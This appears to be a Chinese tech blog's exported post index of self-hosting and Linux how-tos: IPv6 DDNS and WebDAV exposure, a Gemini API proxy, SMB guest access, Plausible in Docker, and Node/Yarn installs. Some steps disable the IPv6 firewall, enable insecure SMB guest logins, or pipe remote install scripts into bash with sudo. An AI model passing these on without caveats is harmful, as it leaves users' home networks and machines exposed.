<p>客户端和服务端必须都有IPv6公网地址才能进行通信，检查是否符合<a href="https://www.test-ipv6.com/">IPv6 测试</a></p>
</blockquote>
<h1 id="主路由开启IPv6"><a href="#主路由开启IPv6" class="headerlink" title="主路由开启IPv6"></a>主路由开启IPv6</h1><p>用桥接模式，PPPoE拨号上网，开启IPv6，关闭IPv6防火墙，检查<a href="https://www.test-ipv6.com/">IPv6 测试</a>，<a href="https://ipcheck.ing/#/">IPCheck.ing</a>，<a href="https://ipw.cn/ipv6/">IPv6地址查询</a>，与路由器显示的IPv6一致就是公网ip</p>
<blockquote>
<p>windows要在网卡打开IPv6才能访问IPv6的网站</p>
</blockquote>
<h1 id="购买域名，DNS解析IPv6"><a href="#购买域名，DNS解析IPv6" class="headerlink" title="购买域名，DNS解析IPv6"></a>购买域名，DNS解析IPv6</h1><p>购买域名，用Cloudflare作为DNS服务器，域名解析IPv6类型选AAAA</p>
<h1 id="API令牌"><a href="#API令牌" class="headerlink" title="API令牌"></a>API令牌</h1><p>Cloudflare获取API令牌，编辑区域DNS，区域资源—包括—帐户的所有区域</p>
<h1 id="DDNS动态域名解析"><a href="#DDNS动态域名解析" class="headerlink" title="DDNS动态域名解析"></a>DDNS动态域名解析</h1><p>下载<a href="https://github.com/jeessy2/ddns-go">ddns-go</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#安装命令</span></span><br><span class="line"><span class="comment">#Mac/Linux: </span></span><br><span class="line">sudo ./ddns-go -s install</span><br><span class="line"><span class="comment">#Win(以管理员打开cmd): </span></span><br><span class="line">.\ddns-go.exe -s install</span><br></pre></td></tr></table></figure>

<p>进入后台<code>http://主机IP:9876</code></p>
<p>DNS服务商选<strong>Cloudflare</strong>，Token填写<strong>API令牌</strong></p>
<p>Domains填<strong>域名</strong>，可填泛域名代表所有二级域名<code>*.abc.com</code></p>
<p>配置DDNS-GO的后台用户名和密码</p>
<h1 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h1><p>旁路由IPv6要用<a href="https://github.com/gdy666/lucky">lucky</a>或者<a href="https://github.com/Lienol/openwrt-package/tree/main/luci-app-socat">socat</a> 转发80,443等被运营商封禁的端口，主路由关闭IPv6防火墙，尝试用外网通过<code>IPv6地址:被转发的端口</code>来访问局域网设备。</p>
<h1 id="申请SSL证书，反向代理"><a href="#申请SSL证书，反向代理" class="headerlink" title="申请SSL证书，反向代理"></a>申请SSL证书，反向代理</h1><p>用<a href="https://caddy2.dengxiaolong.com/docs/">Caddy v2</a>，<a href="https://github.com/NginxProxyManager/nginx-proxy-manager">NginxProxyManager</a>，<a href="https://github.com/gdy666/lucky">lucky</a> 等工具申请SSL证书，将域名反向代理静态IPv4地址，此处亦有端口转发的效果，尝试用外网通过<code>域名:反向代理端口</code>来访问局域网设备。</p>
<h1 id="开启webdav"><a href="#开启webdav" class="headerlink" title="开启webdav"></a>开启webdav</h1><p>用<a href="https://github.com/1715173329/gowebdav">gowebdav</a> 选择硬盘地址，开启webdav，默认端口6086</p>
<h1 id="即可在外网通过域名-端口访问局域网的硬盘"><a href="#即可在外网通过域名-端口访问局域网的硬盘" class="headerlink" title="即可在外网通过域名:端口访问局域网的硬盘"></a>即可在外网通过<code>域名:端口</code>访问局域网的硬盘</h1>]]></content>
      <categories>
        <category>web</category>
        <category>domain</category>
        <category>nginx</category>
        <category>lucky</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>nginx</tag>
        <tag>lucky</tag>
        <tag>domain</tag>
        <tag>ipv6</tag>
      </tags>
  </entry>
  <entry>
    <title>cloudflare中转gemini api到openai格式,配置chatbox客户端</title>
    <url>/posts/b79653ef/</url>
    <content><![CDATA[<h1 id="Gemini-API申请"><a href="#Gemini-API申请" class="headerlink" title="Gemini API申请:"></a>Gemini API申请:</h1><p><a href="https://aistudio.google.com/">Google AI Studio</a></p>
<h1 id="Gemini转OpenAI格式："><a href="#Gemini转OpenAI格式：" class="headerlink" title="Gemini转OpenAI格式："></a>Gemini转OpenAI格式：</h1><p><a href="https://github.com/PublicAffairs/openai-gemini">PublicAffairs&#x2F;openai-gemini: Gemini ➜ OpenAI API proxy. Serverless!</a></p>
<p>Deploy with Workers</p>
<p>Account ID 填 Workers Dashboard 里右侧的 帐户ID</p>
<p>API Token </p>
<ol>
<li>进去 My Profile </li>
<li>创建令牌 </li>
<li>编辑 Cloudflare Workers 使用模板</li>
<li>帐户资源，包括，选所有帐户</li>
<li>区域资源，包括，选所有区域</li>
<li>继续以显示摘要</li>
<li>创建令牌</li>
<li>复制令牌粘贴到 API Token</li>
</ol>
<p>Connect account</p>
<p>Fork the repository</p>
<p>Repository - Actions</p>
<p>workflows enabled</p>
<p>deploy</p>
<p>等actions执行完成</p>
<p>worker Dash</p>
<p>找到gemini</p>
<p>设置，添加自己的域名</p>
<h1 id="ChatBox："><a href="#ChatBox：" class="headerlink" title="ChatBox："></a>ChatBox：</h1><p><a href="https://github.com/Bin-Huang/chatbox">Bin-Huang&#x2F;chatbox: User-friendly Desktop Client App for AI Models&#x2F;LLMs (GPT, Claude, Gemini, Ollama…)</a></p>
<ol>
<li><p>安装ChatBox</p>
</li>
<li><p>设置</p>
</li>
<li><p>模型用openai api</p>
</li>
<li><p>API秘钥填谷歌的gemini api</p>
</li>
<li><p>域名填上面自己的域名</p>
</li>
<li><p>模型选择自定义模型，下面第1个速度快，第2个擅长编程，2选1</p>
</li>
<li><p>gemini-2.0-flash-exp</p>
<p>gemini-exp-1206</p>
</li>
<li><p>保存</p>
</li>
<li><p>新对话模型选gemini</p>
</li>
</ol>
<h1 id="Worker代理WebSocket多模态："><a href="#Worker代理WebSocket多模态：" class="headerlink" title="Worker代理WebSocket多模态："></a>Worker代理WebSocket多模态：</h1><p><a href="https://github.com/tech-shrimp/gemini-proxy">tech-shrimp&#x2F;gemini-proxy: 使用Cloudflare Worker代理Gemini 多模态 API</a></p>
<h1 id="Gemini多模态客户端："><a href="#Gemini多模态客户端：" class="headerlink" title="Gemini多模态客户端："></a>Gemini多模态客户端：</h1><p><a href="https://github.com/ViaAnthroposBenevolentia/gemini-2-live-api-demo">ViaAnthroposBenevolentia&#x2F;gemini-2-live-api-demo: Vanilla JS web interface for Gemini 2.0 Flash Experimental Multimodal API with text, audio, camera, screen inputs and audio response and function calling from the LLM</a></p>
<p>以上内容摘自视频：</p>
<p><a href="https://www.youtube.com/watch?v=_dnYOTrgy80&ab_channel=%E6%8A%80%E6%9C%AF%E7%88%AC%E7%88%AC%E8%99%BETechShrimp">(31) Cloudflare中转Gemini API 到通用格式，Google Gemini编程，音视频，多模态能力测试 - YouTube</a></p>
]]></content>
      <categories>
        <category>ai</category>
        <category>gemini</category>
      </categories>
      <tags>
        <tag>chatgpt</tag>
        <tag>ai</tag>
      </tags>
  </entry>
  <entry>
    <title>组织的安全策略阻止未经身份验证的来宾访问共享文件夹解决方法</title>
    <url>/posts/756d7e3f/</url>
    <content><![CDATA[<blockquote>
<p>访问共享文件夹提示“你不能访问此共享文件夹，因为你组织的安全策略阻止未经身份验证的来宾访问”的解决方法</p>
</blockquote>
<h1 id="方法一（适用于windows版本日期在2020之前）"><a href="#方法一（适用于windows版本日期在2020之前）" class="headerlink" title="方法一（适用于windows版本日期在2020之前）"></a>方法一（适用于windows版本日期在2020之前）</h1><p>1.win+r，在运行框输入“gpedit.msc”，enter回车，进入组策略编辑器。</p>
<p>2.在组策略编辑器中找到“计算机配置”–“管理模板”–“网络”–“Lanman工作站”。点击“启用不安全的来宾登录”。</p>
<p>3.在弹出的“<strong>启用不安全的来宾登录</strong>”选项卡中，将未配置改为“<strong>已启用</strong>”。后点击确认按钮，再次访问共享文件夹即可正常访问了。</p>
<h1 id="方法二（适用于windows版本日期在2020之后）"><a href="#方法二（适用于windows版本日期在2020之后）" class="headerlink" title="方法二（适用于windows版本日期在2020之后）"></a>方法二（适用于windows版本日期在2020之后）</h1><p>1.win+r，在运行框输入“regedit”，enter回车，进入注册表编辑器。</p>
<p>2.依次展开</p>
<p><code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters</code></p>
<p>3.将AllowInsecureGuestAuth的值设置为1，点击确认，再次访问共享文件夹即可正常访问了。</p>
<p>4.依次展开</p>
<p><code>HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\LanmanWorkstation。</code></p>
<p>5.将AllowInsecureGuestAuth设置为1，点击确认。再次访问共享文件夹即可正常访问了。</p>
]]></content>
      <categories>
        <category>tools</category>
        <category>os</category>
        <category>windows</category>
      </categories>
      <tags>
        <tag>tools</tag>
        <tag>os</tag>
        <tag>windows</tag>
      </tags>
  </entry>
  <entry>
    <title>docker搭建plasible网站流量分析平台(新版)</title>
    <url>/posts/27f3948a/</url>
    <content><![CDATA[<p>自托管 <a href="https://plausible.io/blog/community-edition">Plausible Community Edition</a> 的入门指南</p>
<hr>
<h1 id="先决条件"><a href="#先决条件" class="headerlink" title="先决条件"></a>先决条件</h1><ul>
<li>必须在计算机上安装 <a href="https://docs.docker.com/engine/install/">Docker</a> 和 <a href="https://docs.docker.com/compose/install/">Docker Compose</a></li>
<li><strong>CPU</strong> 必须支持 <strong>SSE 4.2</strong> 或 <strong>NEON</strong> 指令集或更高版本（ClickHouse 需要）。</li>
<li>建议至少 <strong>2 GB 的 RAM</strong> 来运行 ClickHouse 和 Plausible 而不必担心 OOM。</li>
</ul>
<h1 id="快速开始"><a href="#快速开始" class="headerlink" title="快速开始"></a>快速开始</h1><h2 id="克隆此存储库："><a href="#克隆此存储库：" class="headerlink" title="克隆此存储库："></a>克隆此存储库：</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#克隆源码文件</span></span><br><span class="line">git <span class="built_in">clone</span> -b v2.1.4 --single-branch https://github.com/plausible/community-edition plausible-ce</span><br><span class="line"></span><br><span class="line"><span class="comment">#屏幕显示如下</span></span><br><span class="line">Cloning into <span class="string">&#x27;plausible-ce&#x27;</span>...</span><br><span class="line">remote: Enumerating objects: 13, <span class="keyword">done</span>.</span><br><span class="line">remote: Counting objects: 100% (10/10), <span class="keyword">done</span>.</span><br><span class="line">remote: Compressing objects: 100% (9/9), <span class="keyword">done</span>.</span><br><span class="line">remote: Total 13 (delta 0), reused 7 (delta 0), pack-reused 3 (from 1)</span><br><span class="line">Receiving objects: 100% (13/13), <span class="keyword">done</span>.</span><br><span class="line"></span><br><span class="line"><span class="comment">#进入文件夹内部</span></span><br><span class="line"><span class="built_in">cd</span> plausible-ce</span><br><span class="line"></span><br><span class="line"><span class="comment">#查看文件夹内文件</span></span><br><span class="line"><span class="built_in">ls</span> -1</span><br><span class="line"></span><br><span class="line"><span class="comment">#有如下文件</span></span><br><span class="line">README.md</span><br><span class="line">clickhouse/</span><br><span class="line">compose.yml</span><br></pre></td></tr></table></figure>

<h2 id="创建并配置您的环境文件："><a href="#创建并配置您的环境文件：" class="headerlink" title="创建并配置您的环境文件："></a>创建并配置<a href="https://docs.docker.com/compose/environment-variables/">您的环境</a>文件：</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#新建环境文件.env</span></span><br><span class="line"><span class="built_in">touch</span> .<span class="built_in">env</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#写入做好DNS解析的域名和随机生成的秘钥到环境文件</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;BASE_URL=https://plausible.example.com&quot;</span> &gt;&gt; .<span class="built_in">env</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;SECRET_KEY_BASE=<span class="subst">$(openssl rand -base64 48)</span>&quot;</span> &gt;&gt; .<span class="built_in">env</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#输出环境文件信息</span></span><br><span class="line"><span class="built_in">cat</span> .<span class="built_in">env</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#屏幕显示如下</span></span><br><span class="line">BASE_URL=https://xxx.com</span><br><span class="line">SECRET_KEY_BASE=As0fZsJlUpuFYSthRjT5Yflg/NlxkFKPRro72xMLXF8yInZ60s6xGGXYVqml+XN1</span><br></pre></td></tr></table></figure>

<p>确保 Set 为您计划托管服务的实际域。该域必须具有指向您的服务器的 DNS 条目，以便正确解析和自动颁发 Let’s Encrypt TLS 证书。下一步将对此进行更多介绍。<code>$BASE_URL</code></p>
<h2 id="使用-compose-覆盖文件向-Web-公开-Plausible-服务器："><a href="#使用-compose-覆盖文件向-Web-公开-Plausible-服务器：" class="headerlink" title="使用 compose 覆盖文件向 Web 公开 Plausible 服务器："></a>使用 <a href="https://github.com/plausible/community-edition/wiki/compose-override">compose 覆盖文件</a>向 Web 公开 Plausible 服务器：</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#插入http和https端口信息</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;HTTP_PORT=80&quot;</span> &gt;&gt; .<span class="built_in">env</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;HTTPS_PORT=443&quot;</span> &gt;&gt; .<span class="built_in">env</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#使用cat和EOF语法写入文件内容，也可以新建compose.override.yml编辑services内容</span></span><br><span class="line"><span class="built_in">cat</span> &gt; compose.override.yml &lt;&lt; <span class="string">EOF</span></span><br><span class="line"><span class="string">services:</span></span><br><span class="line"><span class="string">  plausible:</span></span><br><span class="line"><span class="string">    ports:</span></span><br><span class="line"><span class="string">      - 80:80              </span></span><br><span class="line"><span class="string">      - 443:443</span></span><br><span class="line"><span class="string">EOF</span> </span><br><span class="line"></span><br><span class="line"><span class="comment">#如果80和443端口被占用，可自定义88:80，444:443等映射出来的端口</span></span><br></pre></td></tr></table></figure>

<p>设置并启用自动 Let’s Encrypt TLS 证书颁发。例如，如果您计划在<a href="https://github.com/plausible/community-edition/wiki/reverse-proxy">反向代理</a>后面运行 Plausible，则可能需要选择不同的值。<code>HTTP_PORT=80``HTTPS_PORT=443</code></p>
<h2 id="使用-Docker-Compose-启动服务："><a href="#使用-Docker-Compose-启动服务：" class="headerlink" title="使用 Docker Compose 启动服务："></a>使用 Docker Compose 启动服务：</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker compose up -d</span><br></pre></td></tr></table></figure>

<p>访问 <a href="https://xxx.com/">https://xxx.com</a> 并创建用户</p>
]]></content>
      <categories>
        <category>tools</category>
        <category>docker</category>
      </categories>
      <tags>
        <tag>tools</tag>
        <tag>docker</tag>
        <tag>plausible</tag>
      </tags>
  </entry>
  <entry>
    <title>在linux安装yarn环境</title>
    <url>/posts/be05e3cb/</url>
    <content><![CDATA[<p>总结 在 Ubuntu 上安装 Yarn 环境可以通过以下步骤完成：</p>
<p>步骤 1: 更新系统 首先，确保你的系统是最新的。打开终端并运行以下命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt upgrade</span><br></pre></td></tr></table></figure>

<p>步骤 2: 安装 Node.js Yarn 依赖于 Node.js，因此需要先安装 Node.js。你可以使用 NodeSource 的 PPA 来安装最新版本的 Node.js。运行以下命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -sL &lt;https://deb.nodesource.com/setup_16.x&gt; | sudo -E bash -</span><br><span class="line">sudo apt install -y nodejs</span><br></pre></td></tr></table></figure>

<p>你可以根据需要替换 16.x 为其他版本（如 14.x 或 18.x）。</p>
<p>步骤 3: 安装 Yarn 有几种方法可以安装 Yarn，最常用的是通过 npm 或直接使用 APT。</p>
<p>方法 1: 使用 npm 安装 如果你已经安装了 Node.js 和 npm，可以直接使用 npm 安装 Yarn：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install --global yarn</span><br></pre></td></tr></table></figure>

<p>方法 2: 使用 APT 安装 首先，添加 Yarn 的 APT 仓库：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -sS &lt;https://dl.yarnpkg.com/debian/pubkey.gpg&gt; | sudo apt-key add -</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;deb &lt;https://dl.yarnpkg.com/debian/&gt; stable main&quot;</span> | sudo <span class="built_in">tee</span> /etc/apt/sources.list.d/yarn.list</span><br></pre></td></tr></table></figure>

<p>更新 APT 包索引并安装 Yarn：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install yarn</span><br></pre></td></tr></table></figure>

<p>步骤 4: 验证安装 安装完成后，可以通过以下命令验证 Yarn 是否成功安装：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yarn --version</span><br></pre></td></tr></table></figure>

<p>如果显示版本号，则表示 Yarn 已成功安装。</p>
<p>总结 确保 Node.js 和 npm 已正确安装，以便 Yarn 能够正常工作。</p>
]]></content>
      <categories>
        <category>os</category>
        <category>kali</category>
        <category>ubuntu</category>
        <category>centos</category>
        <category>debian</category>
      </categories>
      <tags>
        <tag>os</tag>
        <tag>kali</tag>
        <tag>ubuntu</tag>
        <tag>debian</tag>
        <tag>centos</tag>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>smartdns对接passwall解决dns泄露，国内外DNS汇总</title>
    <url>/posts/60aba363/</url>
    <content><![CDATA[<h1 id="iStore软件包-iStore-run-Packages"><a href="#iStore软件包-iStore-run-Packages" class="headerlink" title="iStore软件包 iStore .run Packages"></a>iStore软件包 iStore .run Packages</h1><p>下载run安装包——iStore——手动安装——选择run安装包即可自动安装</p>
<p><a href="https://github.com/AUK9527/Are-u-ok/blob/main/apps/README.md">https://github.com/AUK9527/Are-u-ok/blob/main/apps/README.md</a></p>
<p><img src="/img/smartdns/1.webp" alt="1"></p>
<p><img src="/img/smartdns/2.webp"></p>
<p><img src="/img/smartdns/3.webp"></p>
<h1 id="国内外DNS汇总"><a href="#国内外DNS汇总" class="headerlink" title="国内外DNS汇总"></a>国内外DNS汇总</h1><p>UDP传输时间短，加密统一选择：https</p>
<p>DNS查询：<a href="https://dns.ip.cn/">https://dns.ip.cn/</a></p>
<h2 id="国内DNS"><a href="#国内DNS" class="headerlink" title="国内DNS:"></a>国内DNS:</h2><p><strong>阿里公共DNS：</strong></p>
<p>223.5.5.5  类型选择：UDP</p>
<p>223.6.6.6  类型选择：UDP</p>
<p>阿里加密DNS：alidns_ip&#x2F;dns-query  类型选择：https</p>
<p>阿里加密DNS：<a href="http://dns.alidns.com/dns-query">dns.alidns.com&#x2F;dns-query</a>  类型选择：https</p>
<p>DoT 地址: <a href="http://dns.alidns.com/">dns.alidns.com</a></p>
<p>DoH 地址: <a href="https://dns.alidns.com/dns-query">https://dns.alidns.com/dns-query</a></p>
<p><strong>腾讯公共DNS:</strong></p>
<p>DNS：119.29.29.29 类型选择：UDP</p>
<p>腾讯加密DNS：doh.pub&#x2F;dns-query  类型选择：https</p>
<p>腾讯加密DNS：sm2.doh.pub&#x2F;dns-query 类型选择：https</p>
<p>DoT 地址: dot.pub</p>
<p>DoH 地址: <a href="https://doh.pub/dns-query">https://doh.pub/dns-query</a></p>
<p>DoH (国密 SM2,基于腾讯云政企国密解决方案) 地址:<a href="https://sm2.doh.pub/dns-query">https://sm2.doh.pub/dns-query</a></p>
<p><strong>360公共DNS</strong></p>
<p>中国电信&#x2F;铁通&#x2F;移动： 101.226.4.6  218.30.118.6  类型选择：UDP</p>
<p>中国联通： 123.125.81.6   140.207.198.6  类型选择：UDP</p>
<p><strong>百度公共DNS：</strong>180.76.76.76 类型选择：UDP</p>
<p><strong>114DNS：</strong>114.114.114.114  114.114.115.115  类型选择：UDP</p>
<h2 id="国外DNS："><a href="#国外DNS：" class="headerlink" title="国外DNS："></a>国外DNS：</h2><p><strong>CloudflareDNS：</strong>1.1.1.1  类型选择：UDP</p>
<p>Cloudflare加密DNS：1.1.1.1&#x2F;dns-query  类型选择：tls</p>
<p>DoT 地址: <a href="http://cloudflare-dns.com/">cloudflare-dns.com</a></p>
<p>DoH 地址: <a href="https://1dot1dot1dot1.cloudflare-dns.com/">https://1dot1dot1dot1.cloudflare-dns.com/</a></p>
<p><strong>Google DNS：</strong></p>
<p>8.8.8.8   8.8.4.4  类型选择：UDP</p>
<p>谷歌加密DNS：<a href="https://dns.google/dns-query">https://dns.google/dns-query</a>  类型选择：https</p>
<p>谷歌加密DNS：dns.google  类型选择：tls</p>
<p><strong>Norton ConnectSafe：</strong> 199.85.126.10  199.85.127.10 类型选择：UDP</p>
<p><strong>威瑞信：</strong>64.6.64.6  64.6.65.6 类型选择：UDP</p>
<p><strong>Comodo安全DNS：</strong> 8.26.56.2  68.20.247.20 类型选择：UDP</p>
<p><strong>DNS Watch：</strong> 84.200.69.80  84.200.70.40 类型选择：UDP</p>
<p><strong>Quad9：</strong></p>
<p>Quda9加密DNS：<a href="http://dns11.quad9.net/dns-query">dns11.quad9.net&#x2F;dns-query</a></p>
<p>DoT 地址: <a href="http://dns.quad9.net/">dns.quad9.net</a></p>
<p>DoH 地址: <a href="https://dns.quad9.net/dns-query">https://dns.quad9.net/dns-query</a></p>
<p><strong>协议类型知识点:</strong></p>
<p>协议类型解析：UDP:53  tcp:53  tls:853  https:443</p>
<p>相关网址：</p>
<p><a href="https://www.cccitu.com/2205354.html">https://www.cccitu.com/2205354.html</a></p>
<p><a href="https://dns.icoa.cn/dot-doh/">https://dns.icoa.cn/dot-doh/</a></p>
<p><a href="https://cloud.tencent.com/developer/article/1924976?from=15425">https://cloud.tencent.com/developer/article/1924976?from=15425</a></p>
<p><a href="https://www.techug.com/post/free-dns-server-ip-list/">https://www.techug.com/post/free-dns-server-ip-list/</a></p>
<h1 id="查看端口是否被smartdns监听"><a href="#查看端口是否被smartdns监听" class="headerlink" title="查看端口是否被smartdns监听"></a>查看端口是否被smartdns监听</h1><p>用finalshell等ssh客户端进入openwrt后台输入以下命令</p>
<p>1、功能解析：</p>
<ul>
<li>域名TTL：DNS服务器中域名解析记录的保留时间，单位为秒</li>
</ul>
<p>2、查询DNS记录</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nslookup google.com</span><br></pre></td></tr></table></figure>

<ul>
<li>windows下查询</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nslookup smartdns. google.com</span><br></pre></td></tr></table></figure>

<p>3、查询是否开启TCP&#x2F;UDP服务</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">netstat -tlpn |grep 8053</span><br><span class="line"><span class="comment">#查tcp服务，8053端口是否被smartdns监听</span></span><br><span class="line"></span><br><span class="line">netstat -lpn |grep 8053</span><br><span class="line"><span class="comment">#查tcp和udp服务，8053端口是否被smartdns监听</span></span><br></pre></td></tr></table></figure>

<ul>
<li>tlpn解析：-t 选项用于显示 TCP 连接，-l 选项用于显示监听状态的连接，-n 选项用于显示 IP 地址和端口号，-p 选项用于显示与连接关联的进程信息。</li>
</ul>
]]></content>
      <categories>
        <category>os</category>
        <category>openwrt</category>
      </categories>
      <tags>
        <tag>os</tag>
        <tag>openwrt</tag>
      </tags>
  </entry>
  <entry>
    <title>如何在ubuntu安装node.js</title>
    <url>/posts/24b5158a/</url>
    <content><![CDATA[<p>Node.js是一个广受欢迎的JavaScript运行时环境，在Ubuntu系统上安装Node.js有多种方法。本文将介绍三种常用的安装方式，帮助您在Ubuntu18.04上成功部署Node.js环境。</p>
<h3 id="方法1：使用apt包管理器安装Node-js"><a href="#方法1：使用apt包管理器安装Node-js" class="headerlink" title="方法1：使用apt包管理器安装Node.js"></a><strong>方法1：使用apt包管理器安装Node.js</strong></h3><p>使用Ubuntu的默认包管理器apt是安装Node.js最简单的方法：</p>
<ol>
<li>更新包列表：<code>sudo apt update</code></li>
<li>安装Node.js：<code>sudo apt install nodejs</code></li>
<li>安装npm（Node包管理器）：<code>sudo apt install npm</code></li>
<li>验证安装：<code>nodejs -v</code> 和 <code>npm -v</code></li>
</ol>
<h3 id="方法2：使用NVM（Node-Version-Manager）安装"><a href="#方法2：使用NVM（Node-Version-Manager）安装" class="headerlink" title="方法2：使用NVM（Node Version Manager）安装"></a><strong>方法2：使用NVM（Node Version Manager）安装</strong></h3><p>NVM允许您安装和管理多个Node.js版本：</p>
<ol>
<li>下载NVM安装脚本：<code>curl -o- &lt;https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.1/install.sh&gt; | bash</code></li>
<li>重新加载终端配置：<code>source ~/.bashrc</code></li>
<li>安装最新版Node.js：<code>nvm install node</code></li>
<li>验证安装：<code>node -v</code> 和 <code>npm -v</code></li>
</ol>
<h3 id="方法3：使用官方二进制包安装"><a href="#方法3：使用官方二进制包安装" class="headerlink" title="方法3：使用官方二进制包安装"></a><strong>方法3：使用官方二进制包安装</strong></h3><p>从Node.js官网下载并安装二进制包：</p>
<ol>
<li>下载最新的Node.js二进制包</li>
<li>解压文件：<code>tar xf node-v*.tar.xz</code></li>
<li>将解压后的文件夹移动到 &#x2F;usr&#x2F;local 目录：<code>sudo mv node-v*-linux-x64 /usr/local/node</code></li>
<li>配置环境变量，编辑 ~&#x2F;.bashrc 文件，添加：<code>export PATH=/usr/local/node/bin:$PATH</code></li>
<li>重新加载配置：<code>source ~/.bashrc</code></li>
<li>验证安装：<code>node -v</code> 和 <code>npm -v</code></li>
</ol>
<h3 id="结语"><a href="#结语" class="headerlink" title="结语"></a><strong>结语</strong></h3><p>通过以上三种方法，您可以根据自己的需求选择合适的Node.js安装方式。无论选择哪种方法，成功安装后都可以开始在Ubuntu系统上进行Node.js开发了。记得定期更新Node.js以获取最新的功能和安全补丁。</p>
]]></content>
      <categories>
        <category>os</category>
        <category>kali</category>
        <category>ubuntu</category>
        <category>debian</category>
      </categories>
      <tags>
        <tag>os</tag>
        <tag>kali</tag>
        <tag>ubuntu</tag>
        <tag>debian</tag>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>rustdesk连接ubuntu登录界面不支持wayland解决方法</title>
    <url>/posts/b3db3a56/</url>
    <content><![CDATA[<p>RustDesk 自 1.2.0 版本起开始实验性地支持 Wayland。</p>
<h3 id="显示服务器"><a href="#显示服务器" class="headerlink" title="显示服务器"></a>显示服务器</h3><p><a href="https://askubuntu.com/questions/1260142/ubuntu-set-default-login-desktop">Ubuntu</a> | <a href="https://docs.fedoraproject.org/en-US/quick-docs/configuring-xorg-as-default-gnome-session/">Fedora</a> | <a href="https://bbs.archlinux.org/viewtopic.php?id=218319">Arch Linux</a></p>
<h3 id="登录屏幕"><a href="#登录屏幕" class="headerlink" title="登录屏幕"></a>登录屏幕</h3><p>目前尚不支持使用 Wayland 的登录屏幕。如果您想在 RustDesk 重启或注销后访问登录屏幕，则需要将登录屏幕更改为 X11，请在<code>/etc/gdm/custom.conf</code>或<code>/etc/gdm3/custom.conf</code>中将以下行修改为<code>WaylandEnable=false</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">WaylandEnable=<span class="literal">false</span></span><br></pre></td></tr></table></figure>

<p>请重新启动以使上述更改生效。</p>
]]></content>
      <categories>
        <category>os</category>
        <category>kali</category>
        <category>ubuntu</category>
        <category>centos</category>
        <category>debian</category>
      </categories>
      <tags>
        <tag>os</tag>
        <tag>kali</tag>
        <tag>ubuntu</tag>
        <tag>debian</tag>
        <tag>centos</tag>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>linux如何查找文件和目录</title>
    <url>/posts/85cde2ad/</url>
    <content><![CDATA[<p>在Ubuntu中，可以使用以下命令来查找文件和目录：</p>
<p>使用 <code>find</code> 命令来查找文件和目录，语法如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find /path/to/search -name <span class="string">&quot;filename&quot;</span></span><br></pre></td></tr></table></figure>

<p>例如，要在根目录下查找名为 <code>test.txt</code> 的文件，可以使用以下命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -name <span class="string">&quot;test.txt&quot;</span></span><br></pre></td></tr></table></figure>

<p>使用 <code>locate</code> 命令来快速查找文件和目录，语法如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">locate filename</span><br></pre></td></tr></table></figure>

<p>要更新 <code>locate</code> 命令的数据库，可以使用以下命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo updatedb</span><br></pre></td></tr></table></figure>

<p>使用 <code>ls</code> 命令来查看当前目录下的文件和目录，语法如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ls</span></span><br></pre></td></tr></table></figure>

<p>要查看隐藏文件和目录，可以使用以下命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ls</span> -a</span><br></pre></td></tr></table></figure>

<p>使用 <code>grep</code> 命令来搜索文件内容，语法如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">grep <span class="string">&quot;keyword&quot;</span> filename</span><br></pre></td></tr></table></figure>

<p>例如，要在 <code>test.txt</code> 文件中搜索关键词 <code>example</code>，可以使用以下命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">grep <span class="string">&quot;example&quot;</span> test.txt</span><br></pre></td></tr></table></figure>

<p>以上是在Ubuntu中查找文件和目录的几种常用方法，可以根据具体需求选择合适的方法。</p>
]]></content>
      <categories>
        <category>os</category>
        <category>kali</category>
        <category>ubuntu</category>
        <category>centos</category>
        <category>debian</category>
      </categories>
      <tags>
        <tag>os</tag>
        <tag>kali</tag>
        <tag>ubuntu</tag>
        <tag>debian</tag>
        <tag>centos</tag>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>ubuntu卸载与安装软件命令总结</title>
    <url>/posts/2d94cf8f/</url>
